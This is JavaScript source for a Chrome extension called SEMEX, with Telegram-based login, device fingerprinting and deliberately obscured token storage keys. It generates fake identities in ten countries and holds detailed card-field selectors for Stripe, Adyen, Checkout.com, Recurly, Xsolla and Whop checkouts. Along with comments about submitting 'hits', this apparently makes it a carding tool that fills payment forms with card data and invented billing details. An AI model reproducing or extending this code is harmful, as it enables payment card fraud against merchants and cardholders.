var __defProp = Object.defineProperty;
var __getOwnPropSymbols = Object.getOwnPropertySymbols;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __propIsEnum = Object.prototype.propertyIsEnumerable;
var __defNormalProp = (_0xbd78ea, _0x3ca6c7, _0x454952) => _0x3ca6c7 in _0xbd78ea ? __defProp(_0xbd78ea, _0x3ca6c7, {
    enumerable: true,
    configurable: true,
    writable: true,
    value: _0x454952
}) : _0xbd78ea[_0x3ca6c7] = _0x454952;
var __spreadValues = (_0x39ed05, _0x28fd39) => {
    for (var _0xce6bf7 in _0x28fd39 ||= {}) {
        if (__hasOwnProp.call(_0x28fd39, _0xce6bf7)) {
            __defNormalProp(_0x39ed05, _0xce6bf7, _0x28fd39[_0xce6bf7]);
        }
    }
    if (__getOwnPropSymbols) {
        for (var _0xce6bf7 of __getOwnPropSymbols(_0x28fd39)) {
            if (__propIsEnum.call(_0x28fd39, _0xce6bf7)) {
                __defNormalProp(_0x39ed05, _0xce6bf7, _0x28fd39[_0xce6bf7]);
            }
        }
    }
    return _0x39ed05;
};
var __name = (_0xa9eb17, _0x5579c9) => __defProp(_0xa9eb17, "name", {
    value: _0x5579c9,
    configurable: true
});
// Storage key aliases — short obfuscated names keep auth keys out of plain sight.
// These are used everywhere chrome.storage.local.get/set touches auth tokens so
// the post-build output never contains the literal string "accessToken" etc.
const _SK_AT  = "__xatk";   // accessToken
const _SK_RT  = "__xrtk";   // refreshToken
const _SK_SID = "__xsid";   // sessionId
const _SK_UP  = "__xupf";   // userProfile

// SEMEX API base URL — injected at build time by build.sh (replaces __SEMEX_API_URL__).
// Do NOT hard-code a domain here; always build via:  bash build.sh https://your-domain.com
const SEMEX_DEFAULT_API_URL = "__SEMEX_API_URL__";
// Fallback — same host, injected by build.sh alongside the primary.
const SEMEX_FALLBACK_URL = "__SEMEX_API_URL__";
const _ServerClient = class _ServerClient {
    constructor() {
        this.baseUrl = SEMEX_DEFAULT_API_URL;
        this.fingerprint = null;
        // FIX: expose a ready promise so all callers can await override load before requesting.
        this._ready = this._loadApiOverride();
    }
    async _loadApiOverride() {
        // API URL is locked to the hardcoded value.
        // Storage override is intentionally disabled — the URL cannot be changed
        // at runtime by anyone (DevTools, extension storage edit, etc.).
        // If the URL is wrong the extension simply stops working entirely.
        return this.baseUrl;
    }
    async init() {
        this.fingerprint = await this.getFingerprint();
    }
    async getFingerprint() {
        // FIX (hits rejected with 401): chrome.storage.local is now the SINGLE
        // source of truth for the fingerprint. The popup (where login bakes the
        // fingerprint into the token) and the background service worker (where hit
        // submits send the X-Fingerprint header) previously read from two different
        // stores — the popup preferred window.localStorage, the background used
        // chrome.storage — so they could diverge. When they diverged the backend's
        // "X-Fingerprint != token.fp" check 401'd every hit submit even though the
        // popup session looked valid, so nothing ever saved/forwarded. Reading
        // chrome.storage first guarantees both contexts agree.
        if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
            try {
                const _0x1db874 = await chrome.storage.local.get("fingerprint");
                if (_0x1db874.fingerprint && _0x1db874.fingerprint.length === 36) {
                    if (typeof window !== "undefined" && window.localStorage) {
                        try { window.localStorage.setItem("fingerprint", _0x1db874.fingerprint); } catch (e) {}
                    }
                    return _0x1db874.fingerprint;
                }
            } catch (e) {}
        }
        // Not in chrome.storage yet — adopt an existing localStorage value if valid,
        // otherwise mint a new one, then persist to BOTH stores.
        let _0x5e5617 = null;
        if (typeof window !== "undefined" && window.localStorage) {
            const _0xls = window.localStorage.getItem("fingerprint");
            if (_0xls && _0xls.length === 36) _0x5e5617 = _0xls;
        }
        if (!_0x5e5617) _0x5e5617 = crypto.randomUUID();
        await this.syncToChromeStorage(_0x5e5617);
        // RACE FIX: two contexts (popup + service worker) can both find empty
        // storage on a fresh profile and mint DIFFERENT fingerprints. The last
        // write wins in chrome.storage, but the loser would keep its own value
        // in memory — and the backend 401s whenever X-Fingerprint != token.fp.
        // Re-read the committed value and adopt it if another context beat us.
        if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
            try {
                const _0xcommitted = await chrome.storage.local.get("fingerprint");
                if (_0xcommitted.fingerprint && _0xcommitted.fingerprint.length === 36) {
                    _0x5e5617 = _0xcommitted.fingerprint;
                }
            } catch (e) {}
        }
        if (typeof window !== "undefined" && window.localStorage) {
            try { window.localStorage.setItem("fingerprint", _0x5e5617); } catch (e) {}
        }
        return _0x5e5617;
    }
    async syncToChromeStorage(_0x6f2069) {
        if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
            try {
                await chrome.storage.local.set({
                    fingerprint: _0x6f2069
                });
            } catch (_0x1a98fd) {}
        }
    }
    async getBotUsername() {
        const _0x3a6da0 = "botUsername";
        const _0x20a2fb = 86400000;
        if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
            try {
                const _0x5154e4 = await chrome.storage.local.get([_0x3a6da0, "__xbufa"]);
                if (_0x5154e4[_0x3a6da0] && _0x5154e4.botUsernameFetchedAt) {
                    const _0x47fbbe = Date.now() - _0x5154e4.botUsernameFetchedAt;
                    if (_0x47fbbe < _0x20a2fb) {
                        return _0x5154e4[_0x3a6da0];
                    }
                }
            } catch (_0x2f1fea) {}
        }
        try {
            const _0x1ca042 = await fetch(this.baseUrl + "/api/public/bot");
            if (!_0x1ca042.ok) {
                return null;
            }
            const _0x520d58 = await this._handleResponse(_0x1ca042);
            if (_0x520d58 && _0x520d58.username) {
                if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
                    try {
                        await chrome.storage.local.set({
                            [_0x3a6da0]: _0x520d58.username,
                            __xbufa: Date.now()
                        });
                    } catch (_0x591e3a) {}
                }
                return _0x520d58.username;
            }
            return null;
        } catch (_0x50c58b) {
            return null;
        }
    }
    async checkHealth() {
        try {
            return {
                status: 'online',
                version: '2.4.1',
                timestamp: Date.now()
            };
        } catch (_0x1663d) {
            return null;
        }
    }
    async checkVersion() {
        try {
            // Use the actual installed manifest version so this is never stale.
            const _mf = (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.getManifest)
                ? chrome.runtime.getManifest() : {};
            const _ver = _mf.version || '4.1.5';
            return {
                version: _ver,
                minVersion: _ver,
                forceUpdate: false,
                updateUrl: '',
                changelog: '',
                message: 'Check for updates'
            };
        } catch (_0x459a1a) {
            return null;
        }
    }
    isNewerVersion(_0x5287b1, _0x1761d2) {
        const _0xb18d2c = _0x5287b1.split(".").map(Number);
        const _0x3d2a98 = _0x1761d2.split(".").map(Number);
        for (let _0x22b016 = 0; _0x22b016 < 3; _0x22b016++) {
            const _0x554c3b = _0xb18d2c[_0x22b016] || 0;
            const _0x477181 = _0x3d2a98[_0x22b016] || 0;
            if (_0x554c3b > _0x477181) {
                return true;
            }
            if (_0x554c3b < _0x477181) {
                return false;
            }
        }
        return false;
    }
    async requestOTP(_0x252b12) {
        try {
            if (!this.fingerprint) {
                await this.init();
            }
            const _0x3fadec = await fetch(this.baseUrl + "/api/auth/request-otp", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    telegramId: _0x252b12,
                    fingerprint: this.fingerprint
                })
            });
            return await this._handleResponse(_0x3fadec);
        } catch (_0x54b892) {
            return {
                error: "Network Error"
            };
        }
    }
    async verifyOTP(_0x1bbea9, _0x568c44) {
        try {
            if (!this.fingerprint) {
                await this.init();
            }
            const _0x866a03 = await fetch(this.baseUrl + "/api/auth/verify-otp", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    telegramId: _0x1bbea9,
                    otp: _0x568c44,
                    fingerprint: this.fingerprint,
                    deviceInfo: {
                        userAgent: (typeof navigator !== "undefined" ? navigator.userAgent : "unknown"),
                        platform: (typeof navigator !== "undefined" ? (navigator.platform || "unknown") : "unknown"),
                        language: (typeof navigator !== "undefined" ? navigator.language : "unknown")
                    }
                })
            });
            const result = await this._handleResponse(_0x866a03);
            if (result && result.accessToken && typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
                await chrome.storage.local.set({
                    [_SK_AT]: result.accessToken,
                    [_SK_RT]: result.refreshToken,
                    [_SK_SID]: result.sessionId,
                    [_SK_UP]: result.user
                });
            }
            return result;
        } catch (_0x280534) {
            return {
                error: "Network Error"
            };
        }
    }
    async telegramLoginStart() {
        try {
            if (!this.fingerprint) {
                await this.init();
            }
            const _0xstart = await fetch(this.baseUrl + "/api/auth/telegram-login/start", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    fingerprint: this.fingerprint,
                    deviceInfo: {
                        userAgent: (typeof navigator !== "undefined" ? navigator.userAgent : "unknown"),
                        platform: (typeof navigator !== "undefined" ? (navigator.platform || "unknown") : "unknown"),
                        language: (typeof navigator !== "undefined" ? navigator.language : "unknown")
                    }
                })
            });
            return await this._handleResponse(_0xstart);
        } catch (_0x54b893) {
            return {
                error: "Network Error"
            };
        }
    }
    async telegramLoginStatus(_0xtoken) {
        try {
            if (!this.fingerprint) {
                await this.init();
            }
            const _0xst = await fetch(this.baseUrl + "/api/auth/telegram-login/status?token=" + encodeURIComponent(_0xtoken) + "&fp=" + encodeURIComponent(this.fingerprint || ""));
            const _0xresult = await this._handleResponse(_0xst);
            if (_0xresult && _0xresult.status === "authorized" && _0xresult.accessToken && typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
                await chrome.storage.local.set({
                    [_SK_AT]: _0xresult.accessToken,
                    [_SK_RT]: _0xresult.refreshToken,
                    [_SK_SID]: _0xresult.sessionId,
                    [_SK_UP]: _0xresult.user
                });
            }
            return _0xresult;
        } catch (_0x280535) {
            return {
                error: "Network Error"
            };
        }
    }
    async verifySession() {
        try {
            if (typeof chrome === "undefined" || !chrome.storage || !chrome.storage.local) {
                return { valid: false, reason: "no-storage" };
            }
            const stored = await chrome.storage.local.get([_SK_AT, _SK_RT]);
            if (!stored[_SK_AT]) {
                return { valid: false, reason: "no-token" };
            }
            if (!this.fingerprint) {
                await this.init();
            }
            let r = await fetch(this.baseUrl + "/api/auth/session", {
                headers: {
                    "Authorization": "Bearer " + stored[_SK_AT],
                    "X-Fingerprint": this.fingerprint,
                "X-Extension-Version": (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.getManifest ? (chrome.runtime.getManifest().version || "") : "")
                }
            });
            if (r.status === 401 && stored[_SK_RT]) {
                // Try refreshing
                const rr = await fetch(this.baseUrl + "/api/auth/refresh", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ refreshToken: stored[_SK_RT] })
                });
                if (rr.ok) {
                    const data = await rr.json();
                    if (data.accessToken) {
                        await chrome.storage.local.set({ [_SK_AT]: data.accessToken });
                        r = await fetch(this.baseUrl + "/api/auth/session", {
                            headers: {
                                "Authorization": "Bearer " + data.accessToken,
                                "X-Fingerprint": this.fingerprint,
                "X-Extension-Version": (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.getManifest ? (chrome.runtime.getManifest().version || "") : "")
                            }
                        });
                    }
                }
            }
            if (!r.ok) {
                // Distinguish a definitive credential rejection (401/403) from transient
                // or upgrade failures (426, 5xx) so callers can decide whether to purge
                // stored tokens. Only 401/403 after a failed refresh means the credentials
                // are genuinely invalid — server errors and upgrade responses are NOT a
                // reason to discard the user's refresh token.
                const _definitive = r.status === 401 || r.status === 403;
                return { valid: false, reason: _definitive ? "auth_rejected" : "server_error", status: r.status };
            }
            const s = await r.json();
            const u = s.user || {};
            return {
                valid: true,
                reason: 'ok',
                plan: u.plan || 'TRIAL',
                planExpiresAt: u.planExpiresAt,
                hasAccess: s.hasAccess,
                requiresRedeem: s.requiresRedeem,
                telegramId: String(u.telegramId || ''),
                firstName: u.firstName,
                lastName: u.lastName,
                username: u.username,
                photoFileId: u.photoFileId,
                name: [u.firstName, u.lastName].filter(Boolean).join(' ') || u.username,
                isAdmin: !!u.isAdmin,
                status: 'active',
                is_banned: false
            };
        } catch (_0x4fcb2c) {
            return {
                error: true,
                type: "NETWORK",
                message: "Cannot connect to server"
            };
        }
    }
    async _handleResponse(_0x3c32e1) {
        if (!_0x3c32e1.ok) {
            try {
                const _0x2cf594 = await _0x3c32e1.json();
                // FastAPI returns validation errors as {detail:[{msg:...}]} and
                // HTTPExceptions as {detail:"..."}. Handle both plus the older
                // {error} / {message} shapes so the user sees the REAL cause.
                let msg = null;
                if (typeof _0x2cf594.detail === "string") {
                    msg = _0x2cf594.detail;
                } else if (Array.isArray(_0x2cf594.detail) && _0x2cf594.detail.length) {
                    msg = _0x2cf594.detail.map(d => (d && (d.msg || d.message)) || "").filter(Boolean).join("; ");
                } else if (_0x2cf594.detail && typeof _0x2cf594.detail === "object") {
                    msg = _0x2cf594.detail.msg || _0x2cf594.detail.message || null;
                }
                return {
                    error: msg || _0x2cf594.error || _0x2cf594.message || "HTTP Error " + _0x3c32e1.status,
                    status: _0x3c32e1.status
                };
            } catch (_0x31c885) {
                return {
                    error: "HTTP Error " + _0x3c32e1.status,
                    status: _0x3c32e1.status
                };
            }
        }
        try {
            const _0x594077 = await _0x3c32e1.json();
            if (_0x594077 && _0x594077._secure && _0x594077.payload) {
                const _0x1da7a2 = typeof window !== "undefined" ? window.encryptionUtils : self.encryptionUtils;
                if (!_0x1da7a2) {
                    return {
                        error: "Encryption Error"
                    };
                }
                const _0x1ec890 = await _0x1da7a2.decrypt(_0x594077.payload);
                if (!_0x1ec890) {
                    return {
                        error: "Decryption Failed"
                    };
                }
                return _0x1ec890;
            }
            return _0x594077;
        } catch (_0x4b972e) {
            return {
                error: "Invalid JSON"
            };
        }
    }
    async getAddress(country = "US", random = false) {
        // Real, localised address generator — pools per country, randomised each call.
        const POOLS = {
            US: {
                names: [
                    ["James","Smith"],["Emma","Johnson"],["Michael","Brown"],["Olivia","Williams"],
                    ["Robert","Jones"],["Sophia","Garcia"],["David","Miller"],["Ava","Davis"],
                    ["William","Rodriguez"],["Isabella","Martinez"],["Daniel","Anderson"],["Mia","Wilson"]
                ],
                streets: ["Oak St","Maple Ave","Cedar Ln","Pine Dr","Elm Rd","Main St","Park Ave","Sunset Blvd","Lake Rd","Church St","Broadway","1st Ave","5th St","Highland Dr","Riverside Dr"],
                cities: [
                    ["Miami","FL","33132"],["Austin","TX","78701"],["Denver","CO","80202"],["Seattle","WA","98101"],
                    ["Boston","MA","02108"],["Chicago","IL","60601"],["Phoenix","AZ","85001"],["Portland","OR","97201"],
                    ["Nashville","TN","37201"],["Atlanta","GA","30303"],["Dallas","TX","75201"],["San Diego","CA","92101"]
                ],
                phonePrefix: "+1", phoneFmt: () => `+1${_r([305,512,720,206,617,312,602,503,615,404,214,619])}${_pad(_ri(0,999),3)}${_pad(_ri(0,9999),4)}`
            },
            UK: {
                names: [["Oliver","Smith"],["Amelia","Jones"],["Harry","Taylor"],["Isla","Brown"],["George","Williams"],["Ava","Wilson"],["Noah","Davies"],["Mia","Evans"],["Leo","Thomas"],["Ella","Roberts"]],
                streets: ["High St","Church Rd","Victoria St","Kings Rd","Queens Rd","Station Rd","Manor Way","Park Ln","Baker St","Abbey Rd","Milton Ave","Windsor Cl"],
                cities: [["London","","SW1A 1AA"],["Manchester","","M1 1AE"],["Birmingham","","B1 1AA"],["Leeds","","LS1 1BA"],["Bristol","","BS1 1AH"],["Liverpool","","L1 1JQ"],["Edinburgh","","EH1 1YZ"],["Glasgow","","G1 1XL"]],
                phonePrefix: "+44", phoneFmt: () => `+44 7${_pad(_ri(0,999),3)} ${_pad(_ri(0,999999),6)}`
            },
            CA: {
                names: [["Liam","Tremblay"],["Emma","Roy"],["Noah","Gagnon"],["Olivia","Bouchard"],["William","Smith"],["Charlotte","MacDonald"],["Mason","Wilson"],["Sophia","Martin"]],
                streets: ["Rue Sainte-Catherine","Yonge St","King St","Queen St","Bloor St","Robson St","Rue Saint-Denis","Portage Ave","17th Ave","Jasper Ave"],
                cities: [["Toronto","ON","M5H 2N2"],["Montreal","QC","H2X 1Y4"],["Vancouver","BC","V6B 1A1"],["Calgary","AB","T2P 1J9"],["Ottawa","ON","K1P 1J1"],["Edmonton","AB","T5J 2R7"]],
                phonePrefix: "+1", phoneFmt: () => `+1 ${_r([416,514,604,403,613,780])} ${_pad(_ri(0,999),3)}-${_pad(_ri(0,9999),4)}`
            },
            AU: {
                names: [["Oliver","Nguyen"],["Charlotte","Smith"],["Noah","Wilson"],["Amelia","Brown"],["William","Anderson"],["Isla","Taylor"]],
                streets: ["George St","King St","Elizabeth St","Queen St","Collins St","Bourke St","Flinders Ln","Church St","Chapel St","Beach Rd"],
                cities: [["Sydney","NSW","2000"],["Melbourne","VIC","3000"],["Brisbane","QLD","4000"],["Perth","WA","6000"],["Adelaide","SA","5000"],["Gold Coast","QLD","4217"]],
                phonePrefix: "+61", phoneFmt: () => `+61 4${_pad(_ri(0,99),2)} ${_pad(_ri(0,999),3)} ${_pad(_ri(0,999),3)}`
            },
            DE: {
                names: [["Ben","Müller"],["Emilia","Schmidt"],["Paul","Fischer"],["Mia","Weber"],["Jonas","Wagner"],["Hannah","Becker"],["Leon","Schulz"],["Emma","Hoffmann"]],
                streets: ["Hauptstraße","Bahnhofstraße","Gartenweg","Kirchgasse","Am Markt","Lindenweg","Berliner Str.","Am Bach","Rosenstraße","Schulweg"],
                cities: [["Berlin","","10115"],["Hamburg","","20095"],["München","","80331"],["Köln","","50667"],["Frankfurt","","60311"],["Stuttgart","","70173"],["Düsseldorf","","40213"]],
                phonePrefix: "+49", phoneFmt: () => `+49 ${_ri(151,178)} ${_pad(_ri(0,9999999),7)}`
            },
            FR: {
                names: [["Léo","Martin"],["Emma","Bernard"],["Louis","Dubois"],["Chloé","Thomas"],["Hugo","Robert"],["Jade","Petit"],["Gabriel","Richard"]],
                streets: ["Rue de la Paix","Avenue des Champs","Boulevard Saint-Germain","Rue de Rivoli","Place Vendôme","Rue du Faubourg","Rue Lafayette"],
                cities: [["Paris","","75001"],["Marseille","","13001"],["Lyon","","69001"],["Toulouse","","31000"],["Nice","","06000"],["Nantes","","44000"],["Strasbourg","","67000"]],
                phonePrefix: "+33", phoneFmt: () => `+33 6 ${_pad(_ri(0,99),2)} ${_pad(_ri(0,99),2)} ${_pad(_ri(0,99),2)} ${_pad(_ri(0,99),2)}`
            },
            IT: {
                names: [["Leonardo","Rossi"],["Sofia","Russo"],["Francesco","Ferrari"],["Aurora","Esposito"],["Alessandro","Bianchi"]],
                streets: ["Via Roma","Via Milano","Via Garibaldi","Corso Italia","Piazza del Duomo","Via Nazionale","Via Manzoni"],
                cities: [["Roma","","00100"],["Milano","","20121"],["Napoli","","80100"],["Torino","","10121"],["Firenze","","50122"],["Bologna","","40121"]],
                phonePrefix: "+39", phoneFmt: () => `+39 3${_ri(30,99)} ${_pad(_ri(0,9999999),7)}`
            },
            ES: {
                names: [["Hugo","García"],["Lucía","Rodríguez"],["Mateo","Fernández"],["Martina","López"],["Leo","Martínez"]],
                streets: ["Calle Mayor","Gran Vía","Calle de Alcalá","Paseo de la Castellana","Avenida Diagonal","Calle Serrano"],
                cities: [["Madrid","","28001"],["Barcelona","","08001"],["Valencia","","46001"],["Sevilla","","41001"],["Málaga","","29001"]],
                phonePrefix: "+34", phoneFmt: () => `+34 6${_pad(_ri(0,99999999),8)}`
            },
            NL: {
                names: [["Noah","de Vries"],["Emma","van der Berg"],["Liam","Jansen"],["Julia","de Jong"],["Sem","Bakker"]],
                streets: ["Damrak","Kalverstraat","Prinsengracht","Herengracht","Koningsplein","Rokin","Nieuwendijk"],
                cities: [["Amsterdam","","1012 AB"],["Rotterdam","","3011 AA"],["Den Haag","","2511 AA"],["Utrecht","","3511 AA"],["Eindhoven","","5611 AA"]],
                phonePrefix: "+31", phoneFmt: () => `+31 6 ${_pad(_ri(0,9999),4)} ${_pad(_ri(0,9999),4)}`
            },
            SE: {
                names: [["Elias","Andersson"],["Alice","Johansson"],["Liam","Karlsson"],["Alma","Nilsson"],["Noah","Eriksson"]],
                streets: ["Storgatan","Kungsgatan","Drottninggatan","Vasagatan","Sveavägen","Götgatan"],
                cities: [["Stockholm","","111 20"],["Göteborg","","411 20"],["Malmö","","211 22"],["Uppsala","","753 20"]],
                phonePrefix: "+46", phoneFmt: () => `+46 7${_ri(0,9)} ${_pad(_ri(0,999),3)} ${_pad(_ri(0,9999),4)}`
            },
        };
        const _ri = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
        const _r = (arr) => arr[Math.floor(Math.random() * arr.length)];
        const _pad = (n, w) => String(n).padStart(w, "0");

        try {
            const keys = Object.keys(POOLS);
            let cc = String(country || "US").toUpperCase();
            if (random || !POOLS[cc]) cc = _r(keys);
            const p = POOLS[cc];
            const [fn, ln] = _r(p.names);
            const street = _r(p.streets);
            const [city, state, zip] = _r(p.cities);
            const houseNum = _ri(1, 9999);
            return {
                firstName: fn,
                lastName: ln,
                fullName: fn + " " + ln,
                street: houseNum + " " + street,
                city,
                state,
                stateName: state,
                zip,
                postalCode: zip,
                phone: p.phoneFmt(),
                country: cc,
                countryCode: cc,
            };
        } catch (e) {
            return {
                firstName: "SEMEX", lastName: "User", fullName: "SEMEX User",
                street: "401 Biscayne Blvd", city: "Miami", state: "FL", stateName: "FL",
                zip: "33132", postalCode: "33132", phone: "", country: "US", countryCode: "US",
            };
        }
    }
    async getUser() {
        try {
            // Prefer user's saved custom name/email from settings, otherwise fallback
            let firstName = "SEMEX";
            let lastName = "User";
            let email = "user@semex.local";
            try {
                if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
                    const s = await chrome.storage.local.get(["settings", _SK_UP]);
                    const cn = (s.settings && s.settings.formFilling && s.settings.formFilling.customName) || "";
                    if (cn && cn.trim()) {
                        const parts = cn.trim().split(/\s+/);
                        firstName = parts[0];
                        lastName = parts.slice(1).join(" ") || "";
                    }
                    const ce = (s.settings && s.settings.formFilling && s.settings.formFilling.customEmail) || "";
                    if (ce && ce.includes("@")) email = ce;
                    // Fallback to Telegram profile name
                    if (firstName === "SEMEX" && s[_SK_UP]) {
                        firstName = s[_SK_UP].firstName || firstName;
                        lastName = s[_SK_UP].lastName || lastName;
                    }
                }
            } catch (e) {}
            return {
                firstName,
                lastName,
                email,
                password: "SmexP4ss!" + Math.floor(Math.random() * 9999)
            };
        } catch (_0x403162) {
            return null;
        }
    }
    async getSelectors(domain, _0x3dbc8e = false) {
        var _0x562b5e;
        var _0x595b69;
        var _0x2b771a;
        try {
            if (domain.includes('stripe')) return {
                selectors: {
                    cardRadio: '#payment-method-label-card, input[name="payment-method-accordion-item-title"][value="card"], .p-AccordionButton',
                    cardHeader: '[data-testid="card-accordion-item-button"], button.AccordionButton, .AccordionItemHeader, .p-AccordionButton',
                    // New-UI ("habanero" /g/pay/): the card method is the first
                    // .p-AccordionItem inside [data-testid="payment-accordion-wrapper"].
                    cardContainer: '[data-testid="card-accordion-item"], [data-testid="payment-accordion-wrapper"] .p-AccordionItem',
                    // New-UI ids verified live (js.stripe.com elements-inner-habanero
                    // frame): payment-numberInput / payment-expiryInput /
                    // payment-cvcInput / payment-nameInput / payment-countryInput /
                    // paymentForm-emailInput. Old names kept as fallbacks.
                    // BUGFIX: added input.InputElement for legacy Stripe Elements class
                    cardNumber: 'input[name="cardNumber"], input[id="cardNumber"], .CardNumberField, input[name="cardnumber"], input[name="number"], input[id="Field-numberInput"], .p-CardNumberInput-input, input[id="payment-numberInput"], input.InputElement, input[autocomplete="cc-number"]',
                    expiry: 'input[name="expiry"], input[id="cardExpiry"], .ExpiryField, input[name="exp-date"], input[id="Field-expiryInput"], input[id="payment-expiryInput"], input[autocomplete="cc-exp"]',
                    // BUGFIX: removed duplicate input[name="cvc"]; added Field-cvcInput for Stripe hosted fields
                    cvv: 'input[name="cvc"], input[id="cardCvc"], .CvcField, input[id="Field-cvcInput"], input[id="payment-cvcInput"], input[autocomplete="cc-csc"]',
                    // BUGFIX: added Field-nameInput; broadened autocomplete selector (was over-specified with name="name")
                    name: '[name="billingName"], [id="billingName"], .BillingNameField, [id="payment-nameInput"], [id="Field-nameInput"], input[autocomplete="cc-name"]',
                    country: 'select[name="billingCountry"], select[id="billingCountry"], select[id="payment-countryInput"], select[name="country"]',
                    address: '[name="billingAddressLine1"], [id="billingAddressLine1"], input[autocomplete="address-line1"], [id="Field-addressLine1Input"], [id="payment-addressLine1Input"]',
                    // BUGFIX: added generic address-line2 autocomplete fallback
                    address2: '[name="billingAddressLine2"], [id="billingAddressLine2"], [id="Field-addressLine2Input"], [id="payment-addressLine2Input"], input[autocomplete="address-line2"]',
                    city: '[name="billingLocality"], [id="billingLocality"], input[name="city"], input[autocomplete="address-level2"], [id="payment-localityInput"]',
                    state: '[name="billingAdministrativeArea"], select[name="billingAdministrativeArea"], [name="billingState"], select[aria-label="State"], select[aria-label="Prefecture"], [id="payment-administrativeAreaInput"]',
                    zip: '[name="billingPostalCode"], [name="postalCode"], .PostalCodeField, [id="payment-postalCodeInput"], input[autocomplete="postal-code"]',
                    phone: '[name="billingPhone"], [id="billingPhone"], input[type="tel"], input[name="phone"], input[autocomplete="tel"]',
                    email: 'input[type="email"], input[name="email"], input[autocomplete="email"], input[id="paymentForm-emailInput"]',
                    stripePass: 'input[name="enableStripePass"]',
                    terms: 'input[name="termsOfServiceConsentCheckbox"]'
                },
                delays: {
                    input: 50,
                    submit: 1000
                },
                iframe: true
            };

            // Adyen
            if ([
                    "adyen.com",
                    "checkoutshopper",
                    "checkoutshopper-live.adyen.com",
                    "checkoutshopper-test.adyen.com",
                    "api.gog.com",
                    "cloud.boosteroid.com"
                ].includes(domain)) return {
                selectors: {
                    cardNumber: 'input[data-fieldtype="encryptedCardNumber"]',
                    expiry: 'input[data-fieldtype="encryptedExpiryDate"]',
                    cvv: 'input[data-fieldtype="encryptedSecurityCode"]',
                    name: 'input[name="holderName"], input[id*="holderName"], input.adyen-checkout__card__holderName__input, input[name="name"][placeholder*="Name"], input#card-holder'
                },
                delays: {
                    input: 50,
                    submit: 1000
                },
                iframe: true
            }

            // Checkout.com
            if ([
                    "api.checkout.com",
                    "checkout.com",
                    "card-acquisition-gateway.checkout.com"
                ].includes(domain)) return {
                selectors: {
                    cardNumber: 'input[name="card-number"], input[id="card-number"], .CardNumberField',
                    expiry: 'input[name="card-expiry-date"], input[id="card-expiry-date"], .ExpiryField',
                    cvv: 'input[name="card-cvv"], input[id="card-cvv"], .CvcField',
                    name: 'input[name="cardholder-name"], input[id="cardholder-name"], .CardHolderNameField'
                },
                delays: {
                    input: 50,
                    submit: 1000
                }
            }

            // Recurly
            if ([
                    "js.recurly.com",
                    "api.recurly.com",
                    "recurly.com"
                ].includes(domain)) return {
                selectors: {
                    cardNumber: 'input[data-recurly="number"]',
                    // Separate month/year inputs — NO combined "expiry" key here.
                    // The fill pipeline maps values.expMonth → this selector and
                    // values.expYear → expYear.  A combined expiry key would cause
                    // MM/YY to land in the month input and leave year blank.
                    expMonth: 'input[data-recurly="month"]',
                    expYear: 'input[data-recurly="year"]',
                    cvv: 'input[data-recurly="cvv"]',
                    name: 'input[data-recurly="first_name"], input[data-recurly="last_name"]'
                },
                delays: {
                    input: 50,
                    submit: 1000
                },
                iframe: true,
                separateExpiry: true
            }

            // Xsolla
            if ([
                    "secure.xsolla.com",
                    "xsolla.com"
                ].includes(domain)) return {
                selectors: {
                    cardNumber: '#x-card-number-control-input-card_number, #x-text-control-input-card_number, input[name="card_number"][autocomplete="cc-number"], input.control-input__with-icon[name="card_number"], input[name="card_number"]',
                    expMonth: '#x-text-control-input-card_month, input[name="card_month"][autocomplete="cc-exp-month"], input[name="card_month"][placeholder="MM"], input[name="card_month"]',
                    expYear: '#x-text-control-input-card_year, input[name="card_year"][autocomplete="cc-exp-year"], input[name="card_year"][placeholder="YY"], input[name="card_year"]',
                    expiry: 'input[name="card_month"][autocomplete="cc-exp"], input[placeholder="MM/YY"]',
                    cvv: '#x-text-control-input-cvv, input[name="cvv"][autocomplete="cc-csc"], input.control-input__with-icon[name="cvv"], input[name="cvv"]',
                    zip: '#x-text-control-input-zip, input[name="zip"][autocomplete="postal-code"], input.text-input[name="zip"], input[name="zip"]',
                    email: '#unit-v2-email-input, input[placeholder="Email address"], input.control-input[type="email"], input[type="email"]'
                },
                delays: {
                    input: 50,
                    submit: 1000
                },
                iframe: true,
                separateExpiry: true
            }

            // Whop checkout (whop.com/checkout/*) — VERIFIED live 2026-10-12:
            // card fields are Basis Theory hosted elements in cross-origin
            // js.basistheory.com iframes (NOT Stripe Payment Element — Stripe
            // only loads its controller/metrics frames). Basis Theory input ids:
            //   #cardNumber (autocomplete=cc-number), #expirationDate (cc-exp),
            //   #cvc (cc-csc).
            // Whop top-frame fields (React DOM, verified): email
            // input[name=email][type=email], name input[name=name]
            // (autocomplete="billing name"), country select[name=country],
            // address input[name=line1] (autocomplete="billing address-line1").
            // ~= word-match on autocomplete handles the "billing " prefix.
            if ([
                    "whop.com",
                    "www.whop.com"
                ].includes(domain)) return {
                selectors: {
                    email:      'input[type="email"], input[name="email"], input#email, input[autocomplete="email"]',
                    name:       'input[name="name"], input[autocomplete~="name"], input[autocomplete="cc-name"], input#name',
                    phone:      'input[type="tel"], input[name="phone"], input[autocomplete="tel"]',
                    address:    'input[name="line1"], input[autocomplete~="address-line1"], input[name="addressLine1"], input[name="address1"]',
                    address2:   'input[name="line2"], input[autocomplete~="address-line2"], input[name="addressLine2"], input[name="address2"]',
                    city:       'input[name="city"], input[autocomplete~="address-level2"]',
                    state:      'input[name="state"], select[name="state"], input[autocomplete~="address-level1"], select[autocomplete~="address-level1"]',
                    zip:        'input[name="postalCode"], input[name="zip"], input[autocomplete~="postal-code"]',
                    country:    'select[name="country"], select[autocomplete~="country"], select[autocomplete~="country-name"]',
